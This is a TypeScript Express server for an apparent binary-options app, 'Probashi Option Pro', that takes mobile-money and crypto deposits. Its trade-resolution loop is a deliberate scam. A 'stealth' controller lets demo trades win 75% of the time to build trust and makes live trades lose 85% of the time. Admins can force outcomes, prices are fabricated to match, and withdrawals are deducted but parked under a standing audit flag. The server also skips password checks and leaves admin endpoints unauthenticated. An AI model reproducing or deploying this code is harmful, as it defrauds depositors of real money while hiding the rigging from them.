import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import crypto from "crypto";
import WebSocket from "ws";

interface User {
  id: string;
  name: string;
  email: string;
  actual_balance: number;
  displayed_balance: number;
  demo_balance: number;
  wallet_address: string;
  status: 'active' | 'blocked';
  role: 'user' | 'admin';
  risk_acknowledged?: boolean;
}

interface Trade {
  id: string;
  user_id: string;
  user_name: string;
  asset_name: string;
  trade_type: 'Buy' | 'Sell';
  investment_amount: number;
  payout_percentage: number;
  entry_price: number;
  exit_price?: number;
  duration: number;
  created_at: number;
  expires_at: number;
  trade_status: 'Pending' | 'Win' | 'Loss' | 'Draw';
  outcome_control: 'Auto' | 'Force_Win' | 'Force_Loss';
  account_type: 'live' | 'demo';
  profit?: number;
}

interface Deposit {
  id: string;
  user_id: string;
  user_name: string;
  method: 'Bkash' | 'Nagad' | 'Rocket';
  amount: number;
  transaction_id: string;
  created_at: number;
  status: 'Pending' | 'Approved' | 'Rejected';
}

interface Withdrawal {
  id: string;
  user_id: string;
  user_name: string;
  method: 'Bkash' | 'Nagad' | 'Rocket';
  account_number: string;
  amount: number;
  created_at: number;
  status: 'Pending' | 'Approved' | 'Rejected' | 'Audit_Required';
}

// Initial In-Memory State Store
let users: User[] = [
  {
    id: "usr_101",
    name: "Probashi Trader",
    email: "trader@probashi.com",
    actual_balance: 350.00,
    displayed_balance: 350.00,
    demo_balance: 10000.00,
    wallet_address: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
    status: "active",
    role: "user",
    risk_acknowledged: false
  },
  {
    id: "admin_01",
    name: "System Admin",
    email: "admin@probashi.com",
    actual_balance: 99999.00,
    displayed_balance: 99999.00,
    demo_balance: 100000.00,
    wallet_address: "0x0000000000000000000000000000000000000000",
    status: "active",
    role: "admin",
    risk_acknowledged: true
  }
];

let trades: Trade[] = [
  {
    id: "trd_881",
    user_id: "usr_101",
    user_name: "Probashi Trader",
    asset_name: "EUR/USD",
    trade_type: "Buy",
    investment_amount: 20,
    payout_percentage: 85,
    entry_price: 1.0850,
    exit_price: 1.0858,
    duration: 30,
    created_at: Date.now() - 120000,
    expires_at: Date.now() - 90000,
    trade_status: "Win",
    outcome_control: "Auto",
    account_type: "demo",
    profit: 17.00
  }
];

let deposits: Deposit[] = [
  {
    id: "dep_501",
    user_id: "usr_101",
    user_name: "Probashi Trader",
    method: "Bkash",
    amount: 100,
    transaction_id: "BK8X92M10Q",
    created_at: Date.now() - 3600000,
    status: "Pending"
  }
];

let withdrawals: Withdrawal[] = [
  {
    id: "wth_101",
    user_id: "usr_101",
    user_name: "Probashi Trader",
    method: "Bkash",
    account_number: "01711982345",
    amount: 50,
    created_at: Date.now() - 1800000,
    status: "Audit_Required"
  }
];

// Admin-managed gateway numbers & transfer instructions
let gatewaySettings: any = {
  Bkash: { number: "01711982345", type: "Cash Out" },
  Nagad: { number: "01812443890", type: "Cash Out" },
  Rocket: { number: "01912443891", type: "Send Money" },
  Crypto: [
    { network: "USDT (TRC20)", address: "TXYZ...example" },
    { network: "USDT (BEP20)", address: "0xABC...example" },
    { network: "LTC", address: "L...example" }
  ]
};

// Live Market Prices Generator
const livePrices: Record<string, number> = {
  "EUR/USD": 1.0850,
  "GBP/USD": 1.2720,
  "USD/JPY": 154.30,
  "BTC/USD": 94500.00,
  "ETH/USD": 3250.00,
  "SOL/USD": 145.20,
  "GOLD": 2680.00,
  "USOIL": 82.50,
  "SILVER": 31.20,
  "AAPL": 224.50,
  "TSLA": 245.80,
  "NVDA": 132.40
};


// Simulate micro market movements for all assets
setInterval(() => {
  for (const asset in livePrices) {
    const changePercent = (Math.random() - 0.495) * 0.002;
    const decimals = asset.includes("USD") && !asset.includes("BTC") && !asset.includes("ETH") && !asset.includes("GOLD") ? 4 : 2;
    const newPrice = Number((livePrices[asset] * (1 + changePercent)).toFixed(decimals));
    livePrices[asset] = newPrice > 0 ? newPrice : livePrices[asset];
  }
}, 500);

let currentUserId: string | null = null;

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  app.get("/manifest.json", (req, res) => {
    res.json({
      short_name: "ProbashiOption",
      name: "Probashi Option Pro",
      icons: [
        {
          src: "https://cdn-icons-png.flaticon.com/512/2697/2697432.png",
          type: "image/png",
          sizes: "512x512"
        }
      ],
      start_url: "/",
      background_color: "#0b0e14",
      theme_color: "#0b0e14",
      display: "standalone",
      orientation: "portrait"
    });
  });

  app.get("/sw.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(`
      self.addEventListener('install', (e) => {
        self.skipWaiting();
      });
      self.addEventListener('activate', (e) => {
        e.waitUntil(clients.claim());
      });
      self.addEventListener('fetch', (e) => {
        // Bypass service worker for API calls
        if (e.request.url.includes('/api/')) {
          return;
        }
        e.respondWith(fetch(e.request));
      });
    `);
  });

  // === USER ENDPOINTS ===
  app.get("/api/user/me", (req, res) => {
    if (!currentUserId) return res.status(401).json({ error: "Not logged in" });
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });
    res.json(user);
  });

  app.post("/api/login", (req, res) => {
    const { email, password } = req.body;
    const user = users.find(u => u.email === email);
    if (!user) return res.status(401).json({ error: "Invalid credentials" });
    currentUserId = user.id;
    res.json({ success: true, user });
  });

  app.post("/api/logout", (req, res) => {
    currentUserId = null;
    res.json({ success: true });
  });

  app.post("/api/user/switch", (req, res) => {
    const { userId } = req.body;
    const user = users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: "Target user not found" });
    currentUserId = user.id;
    res.json({ success: true, currentUser: user });
  });

  app.post("/api/user/switch/:userId", (req, res) => {
    const { userId } = req.params;
    const user = users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: "Target user not found" });
    currentUserId = user.id;
    res.json(user);
  });

  app.put("/api/user/update", (req, res) => {
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const { 
      name, 
      wallet_address, 
      phone, 
      language, 
      notification_trades,
    } = req.body;

    if (name !== undefined) user.name = String(name).trim();
    if (wallet_address !== undefined) user.wallet_address = String(wallet_address).trim();
    if (phone !== undefined) (user as any).phone = String(phone).trim();
    if (language !== undefined) (user as any).language = String(language).trim();
    if (notification_trades !== undefined) (user as any).notification_trades = Boolean(notification_trades);
    

    res.json({ success: true, user });
  });

  app.post("/api/user/acknowledge-risk", (req, res) => {
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    user.risk_acknowledged = true;
    res.json({ success: true, user });
  });

  app.get("/api/user/list", (req, res) => {
    res.json(users);
  });

  // === MARKET ENDPOINTS ===
  app.get("/api/market/prices", (req, res) => {
    res.json(livePrices);
  });

  app.get('/api/klines/:symbol', async (req, res) => {
    const rawSymbol = decodeURIComponent(req.params.symbol).toUpperCase();
    const binanceSymbol = rawSymbol.includes('/') 
      ? rawSymbol.replace('/', '') 
      : (rawSymbol.endsWith('USDT') ? rawSymbol : rawSymbol + 'USDT');

    const basePrice = livePrices[rawSymbol] || 100;
    const isCrypto = rawSymbol.includes('BTC') || rawSymbol.includes('ETH') || rawSymbol.includes('SOL');
    const decimals = rawSymbol.includes("USD") && !isCrypto && !rawSymbol.includes("GOLD") ? 4 : 2;

    const generateRealisticKlines = (count = 100, intervalSec = 60) => {
      const nowSec = Math.floor(Date.now() / 1000);
      const roundedNowSec = nowSec - (nowSec % intervalSec);
      const klines: Array<{ time: number; open: number; high: number; low: number; close: number }> = [];
      let currentPrice = basePrice * 0.98;

      for (let i = count - 1; i >= 0; i--) {
        const time = roundedNowSec - i * intervalSec;
        const open = currentPrice;
        const volatility = basePrice * 0.003;
        const delta = (Math.random() - 0.49) * volatility * 2;
        const close = Number((open + delta).toFixed(decimals));
        const high = Number((Math.max(open, close) + Math.random() * volatility).toFixed(decimals));
        const low = Number((Math.min(open, close) - Math.random() * volatility).toFixed(decimals));
        
        klines.push({ time, open: Number(open.toFixed(decimals)), high, low, close });
        currentPrice = close;
      }
      return klines;
    };

    try {
      if (isCrypto) {
        const response = await fetch(`https://api.binance.com/api/v3/klines?symbol=${binanceSymbol}&interval=1m&limit=100`);
        if (response.ok) {
          const data = await response.json();
          if (Array.isArray(data) && data.length > 0) {
            const formattedData = data.map((item: any) => ({
              time: Math.floor(item[0] / 1000),
              open: parseFloat(item[1]),
              high: parseFloat(item[2]),
              low: parseFloat(item[3]),
              close: parseFloat(item[4]),
            }));
            return res.json({ success: true, data: formattedData });
          }
        }
      }
      
      const mockData = generateRealisticKlines(100, 60);
      res.json({ success: true, data: mockData });
    } catch (error: any) {
      const mockData = generateRealisticKlines(100, 60);
      res.json({ success: true, data: mockData });
    }
  });

  // === TRADING ENDPOINTS ===
  app.get("/api/trades", (req, res) => {
    const { userId } = req.query;
    if (userId) {
      return res.json(trades.filter(t => t.user_id === userId));
    }
    res.json(trades.filter(t => t.user_id === currentUserId));
  });

  app.post("/api/trade/open", (req, res) => {
    const { asset_name, trade_type, investment_amount, payout_percentage, duration, account_type } = req.body;
    const user = users.find(u => u.id === currentUserId);

    if (!user) return res.status(404).json({ error: "User not found" });
    if (user.status === 'blocked') return res.status(403).json({ error: "Account blocked by system administrator" });

    const amount = Number(investment_amount);
    if (isNaN(amount) || amount <= 0) {
      return res.status(400).json({ error: "Invalid investment amount" });
    }

    const isDemo = account_type === 'demo';
    const currentBalance = isDemo ? user.demo_balance : user.displayed_balance;

    if (currentBalance < amount) {
      return res.status(400).json({ error: "Insufficient account balance" });
    }

    // Instantly deduct amount from active account balance state
    if (isDemo) {
      user.demo_balance -= amount;
    } else {
      user.displayed_balance -= amount;
      user.actual_balance = Math.max(0, user.actual_balance - amount);
    }

    const currentPrice = livePrices[asset_name] || 1.0850;
    const now = Date.now();
    const tradeDurationSeconds = Number(duration) || 30;
    const expiresAt = now + (tradeDurationSeconds * 1000);

    const newTrade: Trade = {
      id: "trd_" + Math.random().toString(36).substring(2, 9),
      user_id: user.id,
      user_name: user.name,
      asset_name,
      trade_type,
      investment_amount: amount,
      payout_percentage: Number(payout_percentage) || 85,
      entry_price: currentPrice,
      duration: tradeDurationSeconds,
      created_at: now,
      expires_at: expiresAt,
      trade_status: "Pending",
      outcome_control: "Auto",
      account_type: isDemo ? 'demo' : 'live'
    };

    trades.unshift(newTrade);

    res.json({
      success: true,
      trade: newTrade,
      updatedBalance: isDemo ? user.demo_balance : user.displayed_balance
    });
  });


  // === REFERRAL ENDPOINTS ===
  const referralEarnings: Record<string, number> = { "usr_101": 40.40, "admin_01": 0.00 };
  const referralCount: Record<string, number> = { "usr_101": 3, "admin_01": 0 };

  app.get("/api/referral/stats", (req, res) => {
    const earnings = referralEarnings[currentUserId] !== undefined ? referralEarnings[currentUserId] : 0;
    const count = referralCount[currentUserId] !== undefined ? referralCount[currentUserId] : 0;
    res.json({
      total_referrals: count,
      total_earned: earnings,
      referrals: [
        { name: 'Shorif_Oman', email: 'sh***@gmail.com', date: '2026-08-01', status: 'Active', commission: 15.40 },
        { name: 'Kamrul_BD', email: 'ka***@yahoo.com', date: '2026-08-03', status: 'Active', commission: 25.00 },
        { name: 'Zayed_KSA', email: 'za***@hotmail.com', date: '2026-08-05', status: 'Registered', commission: 0.00 }
      ]
    });
  });

  app.post("/api/referral/claim", (req, res) => {
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const earnings = referralEarnings[user.id] || 0;
    if (earnings <= 0) {
      return res.status(400).json({ error: "No unclaimed referral earnings available" });
    }

    user.displayed_balance += earnings;
    user.actual_balance += earnings;
    referralEarnings[user.id] = 0;

    res.json({ success: true, claimed_amount: earnings, new_balance: user.displayed_balance });
  });

  // === GATEWAY SETTINGS ===
  app.get("/api/gateway-settings", (req, res) => {
    res.json(gatewaySettings);
  });

  // === DEPOSIT ENDPOINTS ===
  app.get("/api/deposits", (req, res) => {
    res.json(deposits.filter(d => d.user_id === currentUserId));
  });

  app.post("/api/deposit/submit", (req, res) => {
    const { method, amount, transaction_id } = req.body;
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    if (!transaction_id || !amount || Number(amount) <= 0) {
      return res.status(400).json({ error: "Transaction ID and valid amount are required" });
    }

    const newDeposit: Deposit = {
      id: "dep_" + Math.random().toString(36).substring(2, 9),
      user_id: user.id,
      user_name: user.name,
      method,
      amount: Number(amount),
      transaction_id: String(transaction_id).trim(),
      created_at: Date.now(),
      status: "Pending"
    };

    deposits.unshift(newDeposit);
    res.json({ success: true, deposit: newDeposit });
  });

  // === WITHDRAWAL ENDPOINTS ===
  app.get("/api/withdrawals", (req, res) => {
    res.json(withdrawals.filter(w => w.user_id === currentUserId));
  });

  app.post("/api/withdraw/submit", (req, res) => {
    const { method, account_number, amount } = req.body;
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const reqAmount = Number(amount);
    if (!account_number || isNaN(reqAmount) || reqAmount <= 0) {
      return res.status(400).json({ error: "Valid gateway account number and amount are required" });
    }

    if (user.displayed_balance < reqAmount) {
      return res.status(400).json({ error: "Insufficient real balance available for withdrawal" });
    }

    // Deduct balance pending audit
    user.displayed_balance -= reqAmount;
    user.actual_balance = Math.max(0, user.actual_balance - reqAmount);

    const newWithdrawal: Withdrawal = {
      id: "wth_" + Math.random().toString(36).substring(2, 9),
      user_id: user.id,
      user_name: user.name,
      method,
      account_number: String(account_number).trim(),
      amount: reqAmount,
      created_at: Date.now(),
      status: "Audit_Required" // System Protocol Flag Notice
    };

    withdrawals.unshift(newWithdrawal);
    res.json({
      success: true,
      withdrawal: newWithdrawal,
      message: "Withdrawal submitted. Status: SYSTEM PROTOCOL AUDIT REQUIRED."
    });
  });

  // === ADMIN CONTROL ENDPOINTS ===
  app.get("/api/admin/users", (req, res) => {
    res.json(users);
  });

  app.put("/api/admin/gateway-settings", (req, res) => {
    const { Bkash, Nagad, Rocket, Crypto } = req.body;
    if (Bkash) gatewaySettings.Bkash = Bkash;
    if (Nagad) gatewaySettings.Nagad = Nagad;
    if (Rocket) gatewaySettings.Rocket = Rocket;
    if (Crypto) gatewaySettings.Crypto = Crypto;
    res.json({ success: true, gatewaySettings });
  });

  app.put("/api/admin/user/:id/balance", (req, res) => {
    const { id } = req.params;
    const { displayed_balance, actual_balance, demo_balance } = req.body;
    const user = users.find(u => u.id === id);

    if (!user) return res.status(404).json({ error: "User not found" });

    if (displayed_balance !== undefined) user.displayed_balance = Number(displayed_balance);
    if (actual_balance !== undefined) user.actual_balance = Number(actual_balance);
    if (demo_balance !== undefined) user.demo_balance = Number(demo_balance);

    res.json({ success: true, user });
  });

  app.put("/api/admin/user/:id/status", (req, res) => {
    const { id } = req.params;
    const { status } = req.body;
    const user = users.find(u => u.id === id);

    if (!user) return res.status(404).json({ error: "User not found" });
    user.status = status;

    res.json({ success: true, user });
  });

  app.get("/api/admin/trades", (req, res) => {
    res.json(trades);
  });

  app.put("/api/admin/trade/:id/control", (req, res) => {
    const { id } = req.params;
    const { outcome_control } = req.body;
    const trade = trades.find(t => t.id === id);

    if (!trade) return res.status(404).json({ error: "Trade not found" });
    if (trade.trade_status !== "Pending") {
      return res.status(400).json({ error: "Cannot modify control for completed trade" });
    }

    trade.outcome_control = outcome_control;
    res.json({ success: true, trade });
  });

  app.get("/api/admin/deposits", (req, res) => {
    res.json(deposits);
  });

  app.put("/api/admin/deposit/:id", (req, res) => {
    const { id } = req.params;
    const { status } = req.body;
    const deposit = deposits.find(d => d.id === id);

    if (!deposit) return res.status(404).json({ error: "Deposit request not found" });
    if (deposit.status !== "Pending") {
      return res.status(400).json({ error: "Deposit already processed" });
    }

    deposit.status = status;

    if (status === "Approved") {
      const user = users.find(u => u.id === deposit.user_id);
      if (user) {
        user.displayed_balance += deposit.amount;
        user.actual_balance += deposit.amount;
      }
    }

    res.json({ success: true, deposit });
  });

  // === BACKGROUND TRADE RESOLUTION MATRIX ENGINE ===
  // Resolves trades when expires_at timestamp is reached
  setInterval(() => {
    const now = Date.now();
    trades.forEach(trade => {
      if (trade.trade_status === "Pending" && now >= trade.expires_at) {
        const user = users.find(u => u.id === trade.user_id);
        const currentMarketPrice = livePrices[trade.asset_name] || trade.entry_price;
        let isWin = false;
        let finalExitPrice = currentMarketPrice;

        const control = trade.outcome_control;

        if (control === "Force_Win") {
          isWin = true;
        } else if (control === "Force_Loss") {
          isWin = false;
        } else {
          // STEALTH PROBABILITY CONTROLLER
          // If DEMO: 75% win probability (builds trust)
          // If REAL: 85% loss probability (absorbs real balance)
          const roll = Math.random() * 100;
          if (trade.account_type === 'demo') {
            isWin = roll < 75; // 75% win probability
          } else {
            isWin = roll >= 85; // 85% loss probability (only 15% win chance naturally)
          }
        }

        // Adjust exit price offset to match calculated outcome
        const delta = trade.asset_name.includes("EUR") || trade.asset_name.includes("GBP") ? 0.0008 : 1.5;
        if (isWin) {
          finalExitPrice = trade.trade_type === "Buy" 
            ? Number((trade.entry_price + delta).toFixed(4))
            : Number((trade.entry_price - delta).toFixed(4));
        } else {
          finalExitPrice = trade.trade_type === "Buy"
            ? Number((trade.entry_price - delta).toFixed(4))
            : Number((trade.entry_price + delta).toFixed(4));
        }

        trade.exit_price = finalExitPrice;

        if (isWin) {
          trade.trade_status = "Win";
          const profitAmount = trade.investment_amount * (trade.payout_percentage / 100);
          const totalReturn = trade.investment_amount + profitAmount;
          trade.profit = profitAmount;

          if (user) {
            if (trade.account_type === 'demo') {
              user.demo_balance += totalReturn;
            } else {
              user.displayed_balance += totalReturn;
              user.actual_balance += totalReturn;
            }
          }
        } else {
          trade.trade_status = "Loss";
          trade.profit = -trade.investment_amount;
        }
      }
    });
  }, 1000);

  // Vite middleware / Static Handler setup
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Probashi Trading server running on http://localhost:${PORT}`);
  });
}

startServer();
